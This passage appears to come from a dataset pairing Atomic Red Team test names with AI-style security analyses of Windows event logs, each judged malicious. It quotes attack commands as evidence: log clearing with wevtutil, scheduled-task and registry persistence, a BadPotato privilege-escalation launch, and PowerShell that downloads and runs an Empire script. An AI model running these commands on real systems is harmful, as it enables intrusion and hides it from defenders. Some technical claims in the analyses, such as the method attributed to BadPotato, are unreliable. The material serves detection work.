3. **Credential Audit**: Review permissions and credentials for the user `admin_test`. This may involve resetting passwords and ensuring only required privileges are assigned.
4. **Log Monitoring Enhancement**: Enhance logging and monitor configurations to detect similar behavior more proactively in the future. Consider employing advanced threat detection tools that provide better insights into suspicious activities.
5. **Review and Remediation**: Implement any necessary remediation steps based on the findings of the detailed investigation to secure the environment against future attacks."
Admin Account Manipulate,"Upon analyzing the provided event logs from multiple sources, the following observations and assessments can be made:

### Suspicious and Anomalous Behavior:
1. **Clearing of Event Logs (System, Security, PowerShell):**
   - The use of `wevtutil.exe cl` indicates that logs for Microsoft-Windows-Sysmon, System, Security, and Windows PowerShell were cleared by the user `admin_test`.
   - Log clearing is a common tactic used by attackers to erase traces of their activities from the logs.

2. **PowerShell Command Execution:**
   - An unusual PowerShell script execution is observed, which involves renaming local administrator accounts to a randomized name prefixed with ""HaHa_"".
   - The script modifies account descriptions, leveraging `Get-LocalUser`, `Rename-LocalUser`, and `Set-LocalUser` commands.
   - This type of activity is highly suspicious as it alters user account properties, potentially for malicious intents or lateral movement.

3. **Process Execution via High Integrity Level:**
   - Several processes executed by the user `admin_test` with a high integrity level, indicating privileges necessary to perform administrative tasks.

4. **Unauthorized Account Modifications:**
   - Security logs show user account changes, including the renaming of the ""Administrator"" account to ""HaHa_<random>"". 
   - Event ID 4781 confirms the name change, which can be indicative of an attempt to hide the true administrator account.

### Indicators of Malicious Activity:
- The deliberate clearing of logs combined with unauthorized account modifications strongly suggests malicious intent.
- Execution of a PowerShell script that alters administrator account names and descriptions is a red flag.
- The activities demonstrate characteristics of privilege escalation and potential system compromise.

### Assessment and Recommendations:
- **Resolution: MALICIOUS.** The logs unequivocally indicate malicious activity involving potential compromise of administrative accounts and deliberate log tampering to cover tracks.
  
### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Isolate the affected host `Server002` to prevent further lateral movement or potential exfiltration of data.
   - Conduct a detailed forensic analysis of the system to confirm the full scope of compromise.
   - Check for unauthorized changes to user accounts, especially those with administrative privileges.

2. **Access Controls and Monitoring:**
   - Reset passwords for all administrator accounts and enforce multi-factor authentication (MFA) where possible.
   - Set up enhanced monitoring for PowerShell execution, particularly for unsigned scripts.
   - Block or restrict the use of `wevtutil.exe` by regular users.

3. **Log Management:**
   - Ensure centralized logging is in place so that logs can be archived and analyzed even if cleared locally.
   - Implement alerts for log clearing activities.

4. **Remediation and Hardening:**
   - Remove the initially identified malicious script or any backdoor left by the attacker.
   - Apply strict least privilege permissions and review the security configuration of the server.
   - Consider enhanced security training for privileged users on recognizing and preventing such attacks. 

By following these actions, the compromised system can be effectively contained, and future intrusions can be mitigated."
Scheduled task Local,"Upon reviewing the provided Windows event logs, several activities are observed which could be considered as indicators of malicious activity. Let’s analyze the logs step by step:

1. **Sysmon Logs Analysis**:
   - Multiple instances of `wevtutil.exe` are observed being executed by the user `SERVER002\admin_test` with commands like `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`. The `wevtutil` utility is used to manage Windows event logs, and frequent usage of this tool to clear logs can indicate an attempt to hide malicious activity.
   - Shortly following each `wevtutil.exe` command, there is execution of `conhost.exe`, which is used to host the command line interface. This is not unusual but worth noting given the context of other findings.
   - There are scheduled tasks created via `schtasks.exe` with command lines involving `cmd.exe`. The command `/Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10` implies creating a task named “spawn” to run `cmd.exe` once at a specific time, which resembles persistence techniques used by attackers.

2. **System and Security Logs Analysis**:
   - Events (Event ID 104, 1102) indicate that the security, system, and PowerShell event logs were cleared by the user `admin_test`. This action is highly suspect, as attackers often clear logs to cover tracks after gaining unauthorized access.
   - There are multiple logon events (Event ID 4624) and special privileges assigned (Event ID 4672) to `admin_test`, which is not usual unless it is part of routine administrative tasks.

3. **Application and Windows PowerShell Logs**:
   - The application log contains information about standard service operations but lacks details present in the Sysmon and Security logs.

**Assessment**:
- The activity observed, including log clearing, creation of scheduled tasks, and frequent use of `wevtutil.exe` to clear logs, collectively suggest an active attempt to perform and conceal unauthorized operations on the system by leveraging a higher privilege account (`admin_test`).

**Resolution: MALICIOUS**
- Based on the findings, the activities within these logs are not typical of benign operations and indicate steps commonly associated with malicious activities, such as covering tracks and establishing persistence.

**Recommendations**:
- Immediate investigation to identify if `admin_test` has been compromised.
- Review and potentially revoke access for `admin_test` followed by password reset.
- Implement monitoring and alerting for unusual use of administrative utilities and log cleaning.
- Conduct a thorough incident response exercise to identify any further breaches or persistent threats within the network."
Process Injection with Go using CreateThread WinAPI,"In reviewing the provided Windows event logs, I have identified several entries indicative of potentially malicious activity and suspicious behavior:

1. **PowerShell Log:**
   - The PowerShell logs show the execution of a file `CreateThread.exe` located in a path related to the Atomic Red Team framework under `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055\\bin\\x64\\`. The Atomic Red Team is a known open-source toolkit used to test detection of malicious activities, which could indicate a red team assessment or security evaluation is being conducted. However, if this is unexpected, it suggests unauthorized testing or malicious usage.
   
2. **Security and Sysmon Logs:**
   - Several instances of the `wevtutil.exe` command being used to clear event logs across multiple channels (Microsoft-Windows-Sysmon/Operational, Application, Security, and Windows PowerShell). This behavior is commonly used by attackers to cover tracks and avoid detection. The `admin_test` user executed these log clearing commands, as noted by the Event IDs 1102 in the Security log and 104 in the System log.
   
3. **Time Modification:**
   - The log files include several entries (Event ID 4616 from Security logs and 1 from System logs) indicating time changes on the system. Time manipulation can be leveraged by attackers to confuse logging mechanisms and forensic timelines.

4. **Log File Clearing:**
   - The Sysmon log shows multiple `wevtutil.exe` processes executing commands to clear various event logs. The execution of these commands is suspicious and is a well-known tactic used to erase traces of malicious activities.

### Conclusion:
Based on the analysis of the provided logs, the activities recorded are indeed suspicious and indicate potentially malicious behavior rather than benign activities. The use of utility tools like `wevtutil.exe` to clear event logs in swift succession, unexpected PowerShell activity related to the Atomic Red Team framework, and system time adjustments strongly suggest an attempt to obfuscate actions post-compromise or during unauthorized testing.

### Resolution: **MALICIOUS**

### Guidance:
1. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent potential lateral movement.
   - Conduct a full investigation into the context and purpose of the PowerShell execution linked to the Atomic Red Team framework.
   - Review and confirm the legitimacy of any ongoing security assessments. If no such activity was authorized, raise an incident.
   - Evaluate user `admin_test`'s activities and history for further investigation into potential unauthorized access.

2. **Additional Investigation:**
   - Check other systems for similar patterns of event log clearing or PowerShell execution.
   - Validate whether any authorized security testing is documented to avoid false positives.
   - Identify any other compromised credentials.

3. **Prevention Measures:**

   - Use centralized logging systems that cannot be easily altered from endpoints.
   - Train users on recognizing signs of compromise and initiate regular security readiness drills following this incident."
Remote Service Installation CMD,"Upon reviewing the provided Windows event logs, several activities stand out and potentially indicate malicious behavior. Here’s a detailed breakdown of the suspicious activities identified:

### Suspicious and Anomalous Behavior:

1. **PowerShell Execution**
   - There are multiple executions of `powershell.exe` by the user `SERVER002\admin_test`. Although the specific command invocation isn’t shown, frequent or unscheduled execution of PowerShell, especially under an admin account, merits attention due to its use in scripting attacks and automation of administrative tasks.

2. **Event Clearing**
   - The event log indicates multiple instances of logs being cleared (Event ID 104 in System log and 1102 in Security log) done by `admin_test`. Event log clearing is often a red flag as it can indicate an attempt to remove traces of unauthorized or malicious activities.

3. **Wevtutil.exe Usage**
   - Multiple entries show `wevtutil.exe` being executed to clear event logs (`cl` command), which aligns with attempts to cover tracks regarding previous activities, suggesting potentially malicious intentions.

4. **Service Creation with `sc.exe`**
   - The creation and starting of a service named `AtomicTestService_CMD`, using `sc.exe`, which points to a binary located in what could be a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1543.003\bin\AtomicService.exe`). The use of the Atomic Red Team framework indicates potential adversary simulation or testing, but it could also reflect an unauthorized attempt to persist malicious code using services.

5. **Admin-level Activities without Clear Justification:**
   - High integrity-level commands such as `whoami.exe` and `hostname.exe` executed by `SERVER002\admin_test`, typically for enumeration purposes, especially within the context of cleared logs and service creation, suggest reconnaissance or lateral movement attempts.

### Assessment:

Based on the activities observed and associated with the account `SERVER002\admin_test`:
- There is evidence of aggressive log clearing and system modification (via service creation) that aligns with known malicious behavior patterns, such as persistence and forensic evasion.
- While Atomic Red Team’s use can be legitimate in a controlled and authorized security testing context, without clear documentation or approval, such activities are suspicious.

### Conclusion:

**Resolution: MALICIOUS**

The behavior exhibited in these logs—specifically the combination of log clearing with unauthorized service creation and execution of system commands—strongly indicates malicious intent. These actions are consistent with typical hacker techniques to gain and maintain unauthorized access, evade detection, and potentially further exploit the system.

Task Scheduler via VBA,"Upon analyzing the provided logs, several indicators raise concern regarding potential malicious activity:

1. **PowerShell Invocations**:
   - The PowerShell logs indicate the execution of a PowerShell script using a command line that includes downloading and running a script from the internet. This script appears to be part of an offensive security testing tool, specifically referencing ""atomic-red-team"" which is known for emulated threat activities. The use of `Invoke-Expression (IEX)` and downloading files over the internet (`iwr`) in scripts can be a flag for potential malicious behavior, often associated with executing downloaded code.

2. **Sysmon Logs Highlight**:
   - There are multiple Sysmon entries showing executions of `wevtutil.exe` with the command-line argument `""cl""`, indicating the clearing of event logs across different channels (System, Application, Windows PowerShell, and Security). This behavior aligns with tactics used to hide traces of malicious activity by clearing logs.
   - Execution of `powershell.exe` aligns with the suspicious activities listed above, found in both PowerShell and Sysmon logs.
   - The presence of `wsmprovhost.exe` often indicates remote management which, without context, might hint at lateral movement or remote actions conducted by an unauthorized source.

3. **System and Security Logs Anomalies**:
   - Several logs (System and Security) have been cleared, as seen in the events with ""LogFileCleared"" entries. Clearing logs, especially security and system logs, is a common tactic used by attackers post-compromise to eliminate forensic evidence of their activities.
   - The `EventID 1102` in the Security log indicates a complete clearing of the Security log, which is a significant red flag as this log contains records of key security-relevant events.

### Conclusion and Assessment:
- The combination of remote script execution via PowerShell from an external source, the use of tools and methods consistent with offensive tactics, and the suspicious clearing of system, application, and security logs strongly indicate malicious intent.

### Resolution:
- **MALICIOUS**: The logs contain activity consistent with malicious behavior including the potential execution of a script from an external source, and subsequent clearing of logs to cover tracks.

Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"Upon analyzing the provided Windows event logs, several indicators of potentially suspicious activity have been identified:

### PowerShell Log Analysis
The PowerShell events show a script being executed that performs the following actions:
- **Creates a directory in the temporary path**: `$env:TMP\\atomictest\\`.
- **Copies `calc.exe`** from `C:\Windows\System32` into the newly created directory.
- **Modifies a Registry entry**: Specifically, it sets the `Startup` value under the `User Shell Folders` key to point to the new directory.

**Assessment**: These actions suggest an attempt to establish persistence by adding an executable to the startup, which can be suspicious, especially if done in stealth (no visible user activity). The use of PowerShell to modify registry keys and copy executables should be considered suspect unless administratively justified.

### Security Log Analysis
- **Event ID 1102**: The security logs have been cleared, which is often done to hide malicious activity.
- **Privilege Escalation**: The account `admin_test` is granted several privileges, including `SeDebugPrivilege`, which is of concern in the context of potential privilege escalation or lateral movement activities.

### System Log Analysis
- **Event ID 104**: Indicates that log files have been cleared, which corresponds to activities observed in both security and PowerShell logs. Log clearing often suggests an attempt to hide actions from monitoring.

### Sysmon Log Analysis
- **Process Execution with `wevtutil.exe`**: Multiple calls to the `wevtutil.exe` tool to clear event logs (`cl`). This aligns with observed `Event 1102` of cleared logs and is a strong indicator of malicious log tampering.
- **`whoami.exe` and `hostname.exe` Execution**: These commands can be used by scripts or attackers to gather information about the system environment and the executing user context.

### Overall Assessment
The combination of registry modification to potentially establish persistence via startup, execution of PowerShell scripts, privilege escalation activities, and clearing of multiple event logs indicates a strong likelihood of malicious activity.

Azure - adding user to Azure role in subscription,"Upon reviewing the provided Windows event logs, several events stand out as potentially suspicious or indicative of malicious activity:

### Analysis of Suspicious Activities:
1. **Event Log Clearing**:
   - The Security log shows an Event ID 1102, indicating that the Security log was cleared. This is often an activity performed to hide tracks after malicious actions.
   - The System logs also show Event ID 104, indicating that the System log and Windows PowerShell log have been cleared by the user `admin_test`. This is another significant red flag, as it suggests an attempt to cover tracks.

2. **Suspicious PowerShell Activity**:
   - The PowerShell log indicates the execution of a script associated with `admin_test` using PowerShell to interact with Azure (e.g., `Connect-AzAccount`, `New-AzRoleAssignment`). The script uses credentials and manipulates Azure role assignments, which could be legitimate but raises concerns when seen in conjunction with event log clearing.

3. **Creation of Potentially Malicious Processes**:
   - Sysmon logs show that the `wevtutil.exe` command was used multiple times to clear various event logs (Application, System, Security, and Windows PowerShell). The clearing of event logs, especially by non-standard administrative users, is suspicious.
   - There was also an execution of `CompatTelRunner.exe`, though this may be legitimate since it is Microsoft telemetry related, but needs to be carefully checked given its timing with the other suspicious events.

4. **Use of High-Integrity Processes**:
   - Activities are conducted under high integrity levels, suggesting administrative or elevated privileges which are consistent with potential misuse of privileges.

5. **Privileges and Special Security Identifiers**:
   - Event ID 4672 indicates special privileges assigned to new logon sessions, involving key privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, which are sensitive and should be scrutinized especially when related to systems potentially compromised.

### Overall Assessment:
The combination of cleared event logs, unusual PowerShell activity, and privileged process executions strongly indicate malicious intent or compromised activity. The actions appear coordinated to hide tracks and potentially escalate privileges within an Azure environment.

### Resolution: **MALICIOUS**

This set of actions should help mitigate the current threat, analyze the intent and extent of potential compromise, and enhance future security posture."
Scheduled Task Executing Base64 Encoded Commands From Registry,"Upon reviewing the provided logs, several indicators suggest suspicious and potentially malicious behavior:

1. **Event Log Clearing:** There are several instances where the `wevtutil.exe` utility was used to clear logs, specifically targeting the System, Application, Security, and Windows PowerShell event logs. The log clearing was performed by the user `admin_test`. This is a common tactic used by attackers to cover their tracks after compromising a system, as it removes evidence of their activities (Security Event ID 1102 and System Event ID 104).

2. **Suspicious Scheduled Task Creation:** There is an event in the Sysmon logs where `cmd.exe` was used to create a scheduled task with `schtasks.exe`. The command within the task involves executing a PowerShell command using Base64 decoding, which is often a sign of an attempt to obfuscate malicious activity. The registry entry created (`HKCU\SOFTWARE\ATOMIC-T1053.005`) and scheduled task might involve the execution of potentially unwanted or harmful scripts.

3. **Time Change Events:** There are events indicating changes in the system time (`Security Event ID 4616`). While time changes might occur for legitimate reasons, when done in close succession with log clearing, it could indicate an attempt by an attacker to manipulate event timestamps to further obscure their activities.

4. **Process Execution with High Integrity:** Processes such as `wevtutil.exe`, `cmd.exe`, and `powershell.exe` are executed with a high integrity level by the user `admin_test`. The execution of these processes with elevated privileges suggests potential malicious behavior, especially in the context of log deletion and task scheduling.

5. **Use of System Utilities:** The presence of commands involving `whoami.exe`, `hostname.exe`, and other built-in Windows utilities suggests reconnaissance activity, where an attacker may be gathering system information.

Based on the analysis, the logs exhibit several signs indicative of potentially malicious activity:

- **Resolution: MALICIOUS**

### Recommendations:
- **Immediate containment:** Isolate the affected host to prevent further escalation or lateral movement.

- **System Restoration:** Consider restoring the system from a known good backup after ensuring that the compromise is fully contained and understood.
- **Monitoring and Improvement:** Enhance monitoring to detect similar patterns in the future and consider user behavior analytics to detect anomalies like these."
Domain Password Policy Check: No Special Character in Password,"Upon reviewing the provided Windows event logs, several key observations point towards suspicious and potentially malicious activities:

1. **Log Clearing Events:**
   - There are multiple instances of the `wevtutil.exe` process clearing logs, as evidenced by the presence of commands such as `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational` and similar commands for PowerShell and System logs.
   - Event 1102, recorded in the Security log, indicates the security logs were cleared (`LogFileCleared` by `admin_test`). Log clearance without a legitimate administrative reason is often a sign of malicious activity trying to cover its tracks.

2. **PowerShell Script Execution:**
   - Observed PowerShell script attempts to change an Active Directory (AD) account's password and compares it against a pre-stored password in a credential file, with a clear message indicating password validation and change.
   - Such PowerShell activities are often associated with credential harvesting or unauthorized privilege elevations.

3. **Use of `wsmprovhost.exe` and High Integrity Level:**
   - The `wsmprovhost.exe` service was used as a parent for multiple spawned processes including `wevtutil.exe`. This could indicate the exploitation of the Windows Management Infrastructure (WMI) for executing scripts or commands remotely and with high privileges.

4. **Unusual Process Execution:**
   - The spawning of system utilities such as `HOSTNAME.EXE`, `whoami.exe`, alongside wevtutil.exe, indicates profiling actions taken by the user `admin_test`, possibly to gather system-specific or user-specific details.
   - The processes are executed under a high integrity level, suggesting an administrative level of access.

5. **User Context:**
   - Most events revolve around a user `SERVER002\admin_test`, pointing to the use of an account with elevated privileges.

6. **Installation and Update Actions:**
   - Numerous processes are related to Microsoft Edge updates. While these may seem normal, further investigation is needed to ensure these are legitimate and not masquerades.

### Assessment and Guidance:
Based on the evidence of log clearance, unusual PowerShell activity, and execution of system profiling commands, the logs exhibit potential indicators of compromise consistent with the following:

- **Indicators of Malicious Activity:**
  - Log clearance events without explanation are highly suspicious, suggesting an attempt to hide malicious actions.
  - Suspicious PowerShell usage for password manipulation suggests unauthorized access or privilege escalation.
  
Given these observations, further investigation into the activities of `admin_test`, processes executed, and the motive for log clearance is necessary. Additionally, audit and verify PowerShell execution policies and script origin. This may include checking security patches and policies to avoid similar exploitation vectors in the future.

**Final Resolution: MALICIOUS**

This conclusion is based on the combination of log clearance, unauthorized PowerShell script execution for sensitive account manipulation, and system profiling under an elevated privilege context, all pointing to malware or a concerted manual attack. Immediate steps should be taken to isolate affected systems, conduct a thorough forensic investigation, and ensure all endpoints are secured."
Bad Potato,"### Detailed Analysis of the Logs

#### 1. **Unusual Process Execution and Command-Line Usage**
- The PowerShell execution log reveals a suspicious command:
  - **Command**: `""powershell.exe"" & {cd ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\""`, `Start-Process .\\BadPotato.exe notepad.exe`
  - **Analysis**: `BadPotato.exe` is a known exploit tool used for privilege escalation by leveraging a vulnerability in Windows through the `Brokenshiv` method. The usage of `BadPotato.exe` along with PowerShell commands to start and stop processes like `notepad.exe` is indicative of a potential attack technique simulation tool, possibly due to `Atomic Red Team` (a known framework of simulated attacks for testing defensive capabilities).

#### 2. **Event Log Clearing**
- The logs indicate a series of `wevtutil.exe` commands used to clear various event logs:
  - **Security Log Clearance**: 
    - **ProcessId**: ""4620"", cleared by user `admin_test`
    - **Event**: `{""EventID"":""1102""}` on `Channel: Security`
  - Similar commands were used to clear the `System` and `Windows PowerShell` logs, all by the `admin_test` user.
  - **Analysis**: Clearing event logs is a common tactic used by attackers to cover their tracks. This is highly suspicious behavior, unless sanctioned and documented as part of normal IT operations.

#### 3. **High Integrity Level Commands**
- The observed commands were executed with a high level of integrity by the user `SERVER002\\admin_test`. This indicates that the user had elevated privileges, which reinforces the risk of misuse or compromise.
  
#### 4. **Execution of Windows Utilities with Unusual Frequency**
- Various Windows command-line utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` were executed in rapid succession. While these might be benign in isolation, the context provided by neighboring events such as log clearance adds to suspicion.

### Threat Assessment and Risk Identification
- **Indicators of Malicious Activity**: The execution of `BadPotato.exe` and subsequent clearance of event logs are strong indicators of malicious intent or at least risky behavior.
- **User Activity**: The user `admin_test` was involved in executing suspicious commands and clearing logs. This user account should be closely monitored and reviewed for any signs of unauthorized access.

### Guidance on How to Proceed
1. **Immediate Actions**:
   - **Containment**: Temporarily revoke `admin_test` privileges to prevent further potential misuse.
   - **Investigation**: Conduct a thorough investigation into the timeline of these events to understand the context and scope of actions.
   - **Verification**: Verify if the execution of `Atomic Red Team` tests was authorized, as it sometimes uses known exploit tools like `BadPotato`.

2. **Long-term Actions**:
   - **User Access Review**: Conduct a comprehensive review of admin accounts and privileges.
   - **Monitoring**: Enhance monitoring on the system, particularly for the execution of PowerShell scripts and event log alterations.
   - **Training**: Educate system administrators on detecting and responding to privilege escalation attempts.

### Resolution
- **Resolution**: **MALICIOUS**
  - The combination of running exploit tools, manipulating event logs, and executing commands with high integrity suggests that the logs contain clear indicators of malicious activity. Immediate action is necessary to assess and mitigate potential threats to the system's security."
Add a driver,"### Detailed Log Analysis

The logs provided indicate the following key incidents:

#### 1. Time Manipulation
- **EventID 4616** from the Security log and corresponding Kernel-General events in the System log indicate a time change on the system.
  - **Old Time:** 2024-10-27 15:03:08.4000909
  - **New Time:** 2024-10-27 15:03:00.3992092

Time changes not initiated by authorized personnel can be suspicious, particularly as attackers can use this technique to hinder log correlation and incident investigations.

#### 2. Log Clearing Activity
- **EventID 104** from the System log indicates log files were cleared:
  - Multiple clear logs events targeting various logs (System, Windows PowerShell, Security) by user **admin_test** using `wevtutil.exe`.
  - **EventID 1102** in the Security log confirms the security log was cleared.

Clearing event logs is a classic tactic to cover tracks after malicious activity.

#### 3. Unusual Command Execution
- Series of **Sysmon EventID 1** indicate the execution of several system utilities like `wevtutil.exe`, `whoami.exe`, `hostname.exe`, and `pnputil.exe`:
  - Commands like `""C:\Windows\system32\wevtutil.exe"" cl Security`, `""cmd.exe"" /c pnputil.exe /add-driver ""C:\Windows\INF\usbstor.inf""`.
  
The command to add a driver (`pnputil.exe`) is potentially risky if not an administrator-initiated action. Coupled with the log clearing and time manipulation, these may suggest preparation for or an execution of an unauthorized action.

### Assessment

The combination of time changes, log clearing activities, and execution of sensitive commands, especially by a user with high integrity level privileges (likely an administrator), provides strong indicators of potential malicious activities. The consistent involvement of the user **admin_test** across these events increases the suspicion of deliberate acts.

### Resolution

**Resolution: MALICIOUS**

### Recommendations

1. **Immediate Isolation**: Isolate the affected host (Server002) from the network to prevent further potential malicious actions.
2. **Full Forensic Investigation**: Conduct a deeper forensic analysis into the actions performed by the user **admin_test** and any outbound connections from the host.
3. **Review User Access**: Verify the recent access patterns/reviewer credentials and permissions associated with the **admin_test** account.
4. **Enhanced Monitoring**: Implement tighter monitoring controls on sensitive commands execution and log manipulation activities.
5. **Incident Report**: Document this as a security incident and notify relevant internal security teams for further incident response action.

The evidence points to behaviors that align with tactics used in malicious activities, warranting the classification as Malicious and calling for immediate action."
Named pipe client impersonation,"Upon reviewing the provided Windows event logs across multiple categories, several suspicious activities indicative of potential malicious actions have been identified:

1. **Unusual PowerShell Activity:**
   - The PowerShell logs indicate execution of a script sourced from `https://raw.githubusercontent.com/BC-SECURITY/Empire/.../Get-System.ps1`. This is a known path associated with a penetration testing tool called Empire. The script `Get-System.ps1` is typically used for privilege escalation. The command uses Invoke-Expression (`IEX`) fetched by `Invoke-WebRequest` (`IWR`) in a commonly obfuscated format, which is a tactic frequently used by attackers to execute scripts directly from the internet.

2. **Clearing of Event Logs:**
   - The Sysmon and Security logs both record the use of the `wevtutil.exe` command to clear logs (`cl`). Events indicate that logs for channels such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` have been cleared. Clearing of logs is a common tactic used by attackers to cover their tracks.

3. **Logon and Privilege Escalation:**
   - The Security logs show an account ""admin_test"" performing logon actions and being associated with high-level privileges (`SeSecurityPrivilege`, `SeDebugPrivilege`, etc.). This, combined with the timing of log clearing and suspicious script execution, suggests potential unauthorized or malicious activity.

4. **Time Manipulation:**
   - There are multiple entries in the System log where the system time was adjusted. While this could be benign, it is commonly associated with manipulation for complicating log analysis or bypassing timestamp-based detections.

5. **Sysmon Process Executions:**
   - Observations of multiple executions involving `wevtutil.exe`, `conhost.exe`, and PowerShell within a short time span and with elevated privileges align with typical adversarial behavior patterns aimed at reconnaissance or execution of a malicious payload.

**Assessment:**

The combination of suspicious PowerShell execution, event log clearing, time adjustments, and logon events with elevated privileges presents strong indicators of a compromise on the investigated host.

**Resolution: MALICIOUS**

This analysis identifies a series of events and activities that strongly indicate malicious behavior and a compromise of the system. It is recommended to isolate the affected host for further forensic analysis, review network traffic related to the external URLs involved, and conduct a thorough investigation into the ""admin_test"" account activities. Additionally, assess and update security monitoring and incident response procedures to prevent such incidents in the future."
RunPE via VBA,"After reviewing the provided Windows event logs, several key observations can be made regarding suspicious or anomalous activities:

1. **Log Clearing Activity (Event ID 1102 and 104):**
   - The event logs began with multiple occurrences of log clearing events (Event ID 1102 in the Security log and Event ID 104 in the System log) executed by the user `admin_test`. This is a significant red flag as clearing log files can indicate an attempt to cover tracks after malicious activity.
   - The usage of `wevtutil.exe` command to clear logs from Security, System, Windows PowerShell, and Sysmon channels supports this observation.

2. **Suspicious PowerShell Execution (Windows PowerShell log and Sysmon log):**
   - A PowerShell command executed scripts from a remote source and ran a script named `Invoke-MalDoc.ps1`. The script attempts were run as `Invoke-MalDoc -macroFile`, which might indicate an attempt to execute potentially malicious macros through a Microsoft Office product (likely Word). This is a common attack vector used in phishing and malware campaigns.

3. **Execution of Tools Indicative of Enumeration (Sysmon log):**
   - There are logs showing the execution of `wevtutil.exe`, `whoami.exe`, and hostname commands which are commonly used in system enumeration by threat actors.
   - The execution of `wevtutil.exe` to export logs (`""C:\\Windows\\system32\\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx`) and other logging-related commands further indicates attempts to analyze or manipulate log information.

4. **Presence of High Privilege Token (Event ID 4672):**
   - Multiple `Special privileges assigned to new logon` events suggest potential privilege escalation activities, granting high-level privileges to certain processes.

5. **Credential Access Failure Events (Event ID 5379):**
   - There are numerous occurrences of Event ID 5379 indicating unsuccessful attempts to retrieve credential information, which could be brute force attempts or misconfigurations from malicious attempts.

### Assessment:

The sequence of events strongly suggests malicious activity:
- The clearing and manipulation of logs.
- Execution of external scripts via PowerShell from a non-trusted repository.
- Use of enumeration tools.
- Attempted access to credential data.

### Resolution: MALICIOUS

Given the evidence of log clearing, potential malware execution, and suspicious usage of native Windows utilities typically associated with lateral movement or privilege escalation tactics, the activities observed within these logs indicate clear signs of malicious behavior.

### Guidance:

1. **Immediate Response:**
   - Isolate the affected system from the network to prevent further malicious activities and lateral movement within the network.
   - Conduct a thorough forensic analysis on the isolated host to assess the extent of the compromise.

2. **Root Cause Analysis:**
   - Analyze historical data and network logs to track the origin of the breach and any point of initial access.
   - Evaluate how the malicious scripts were able to be executed and consider reviewing email security gateways for potential phishing campaigns. 

3. **Mitigation:**
   - Re-image the compromised machine to ensure all malicious activities and persistence mechanisms are fully removed.
   - Reset credentials associated with the affected user accounts and enable multi-factor authentication where applicable.

4. **Policy Enforcement:**
   - Enforce stricter PowerShell and logging policies, including script-block logging and securing PowerShell with JEA (Just Enough Administration).

5. **Training & Awareness:**
   - Conduct security awareness training for employees, emphasizing the recognition of phishing attempts and safe email practices.

These steps will help mitigate the current incident and strengthen security posture to prevent similar occurrences in the future."
Reg Key RunOnce,"Upon reviewing the provided logs, several activities suggest suspicious and potentially malicious behavior on the server (Server002). Here's a detailed examination of the notable events:

### Suspicious and Potentially Malicious Activity:

1. **Event Log Clearing:**
   - **Security Log (Event ID 1102):** The security log was cleared at `2024-10-27 15:16:35.0029712`, and the user responsible for this action was `admin_test` (as indicated by ""SubjectUserName""). This is a red flag; malicious actors often clear logs to hide their tracks after unauthorized actions.
   - **System Log (Event ID 104):** Logs for the System and Windows PowerShell channels were cleared shortly before and just after the security logs. This consistent log clearing suggests an attempt at covering up actions.

2. **Time Manipulation:**
   - **Security Log (Event ID 4616):** There are two closely sequenced changes to the system time (`2024-10-27 15:16:34.1002056` to `2024-10-27 15:16:39.4609736` and then back to `2024-10-27 15:16:34.1017524`). Time changes can be used to manipulate log entries or time-based security mechanisms.

3. **Use of `wevtutil.exe`:**
   - Multiple `wevtutil.exe` executions (Sysmon Log Event ID 1) were running under the user `admin_test`, with command lines indicating clearing of the logs (commands like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational`). This behavior is consistent with attempts to erase evidence via log files.

4. **Suspicious Registry Modification:**
   - **Cmd.exe Execution (Sysmon Log Event ID 1):** There is a command executed by `cmd.exe` that modifies the registry to add a suspicious DLL file (`AtomicRedTeam.dll`) via a `RunOnceEx` key. Such modifications could represent an attempt at persistence via malicious code, potentially executed on the next system reboot.

5. **PowerShell Activity:**
   - The absence of specific entries in the Windows PowerShell log is notable, especially given the context of cleared logs. PowerShell is often used maliciously for administrative tasks when controls are inadequate.

### Threat Assessment:

The actions observed in the logs align with typical behavior seen in malicious scenarios where attackers obtain elevated rights to clear logs, alter time settings, and establish persistence mechanisms. The repeated clearing of different log channels, coupled with suspicious process execution and registry modifications, are highly irregular activities that warrant immediate attention.

### Guidance:

- **Immediate Actions:**
  - **Investigate User `admin_test`:** Review account activity, permissions, and recent changes. Assess whether credentials were compromised.
  - **Forensic Analysis:** Conduct a memory and disk forensic analysis to identify any dormant malware or additional unauthorized changes.
  - **Network Isolation:** If still active, isolate the affected system to prevent further lateral movement within the network.
  
- **Mitigation Steps:**
  - **Password Changes:** Force reset for likely affected high-priority user accounts.
  - **Log Monitoring and Alerts:** Strengthen monitoring rules to alert on log clearing events and similar suspicious activities.
  - **Patches and Updates:** Ensure systems are updated, especially security patches, to minimize vulnerabilities.

Resolution: **MALICIOUS** - the logs contain clear signs of malicious activities, particularly related to log tampering, time manipulation, and registry alterations, indicative of a probable compromise."
EXO - Full access mailbox permission granted to a user,"Analysis of the provided Windows event logs reveals a number of activities that suggest potentially suspicious behavior relating to system audit events and process executions:

1. **Event Log Clearing:**
   - The presence of event log clearing on Server002 is a major red flag. In the Security log, Event ID 1102 indicates that the Security log was cleared by the user `admin_test`. In the System log, Event ID 104 indicates the System log and the Windows PowerShell log were cleared around the same time, also by `admin_test`.
   - The use of `wevtutil` to clear logs (indicated in the Sysmon logs) is commonly associated with efforts to hide unauthorized or malicious activity, as it deletes past audit records and could indicate a potential cover-up of malicious actions.

2. **Unusual PowerShell Activity:**
